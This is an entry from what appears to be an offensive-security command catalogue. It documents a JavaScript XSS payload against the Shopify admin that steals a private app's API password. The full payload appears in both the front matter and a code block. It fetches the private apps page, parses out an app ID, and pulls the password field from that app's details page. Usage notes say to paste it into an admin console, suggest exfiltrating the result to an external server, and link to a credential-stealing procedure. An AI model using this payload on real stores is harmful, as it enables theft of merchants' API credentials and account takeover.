---
id: cmd-uuid-3
data: >-
  fetch('/admin/apps/private',{headers:{'X-Shopify-Web':1}}).then(function(data){console.log(data.text().then(function(data){fetch('/admin/apps/private/'+data.split('href="/admin/apps/private/').pop().split('"').shift(),{headers:{'X-Shopify-Web':1}}).then(function(data){console.log(data.text().then(function(data){alert(data.split('id="private_app_password"').pop().split('value="').slice(1).shift().split('"').shift())}))}))})})
tags:
  - xss
  - shopify
  - javascript
type: command
output: Alert with API password
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:06.618Z'
verified: false
validated: true
submitted: true
---
# shopify-fetch-private-app-password

## Command

```bash
fetch('/admin/apps/private',{headers:{'X-Shopify-Web':1}}).then(function(data){console.log(data.text().then(function(data){fetch('/admin/apps/private/'+data.split('href="/admin/apps/private/').pop().split('"').shift(),{headers:{'X-Shopify-Web':1}}).then(function(data){console.log(data.text().then(function(data){alert(data.split('id="private_app_password"').pop().split('value="').slice(1).shift().split('"').shift())}))}))})})
```

## Description

JavaScript command (decoded from XSS payload) to fetch Shopify private apps list, extract an app ID via string parsing, fetch details, and alert the password field value.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| fetch | HTTP request to admin paths | Yes |
| headers | {'X-Shopify-Web':1} to mimic web requests | Yes |
| split/pop/shift/slice | Parse HTML for ID and password | Yes |

## Examples

### Basic Usage

```bash
Paste into browser console on admin page
```

### Advanced Usage

Modify alert to exfil via fetch to external server.

## Expected Output

Console logs of raw HTML and alert displaying the private app password.

## Related

- [[commands/shopify-newsletter-xss-steal-api-key]]
- [[procedures/Exploit-XSS-to-Steal-Administrative-API-Keys]]
